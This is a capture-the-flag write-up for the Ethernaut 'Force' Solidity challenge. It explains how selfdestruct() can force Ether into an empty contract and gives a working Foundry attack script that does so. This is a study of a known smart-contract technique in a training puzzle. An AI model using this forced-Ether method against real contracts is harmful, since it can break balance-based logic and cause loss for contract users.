# Force   
Our mission in this challenge is to increase the contract's balance to be greater than 0.
However, when we look at the code, we notice something unusual:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
This contract is completely empty—it has no functions or logic to receive funds. So, how can we possibly deposit Ether into it? 🤔🤔

The key to solving this challenge lies in understanding the deprecated [`selfdestruct()`](https://www.cyfrin.io/glossary/self-destruct-hack-solidity-code-example) function. This function allows a contract to destroy itself and send its remaining Ether to a specified address. Even if the target contract has no receive() or fallback() functions, it will still receive the Ether.

To exploit this, we need to create a contract that implements selfdestruct() and set the target contract's address as the recipient. This way, we can force the target contract to accept our Ether.

Here’s how I automated this process using a script: 
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
	Selfdestroying selfdestroying;

	function run() public {
	vm.startBroadcast();
	selfdestroying = new Selfdestroying{value: 0.001 ether}(/* Your instance address*/);
	selfdestroying.attack();
	vm.stopBroadcast();
}
}

contract Selfdestroying {
	address victim;

	constructor(address _victim) payable {
	victim = _victim;
}
	function attack() public {
	selfdestruct(payable(victim));
}
}

```
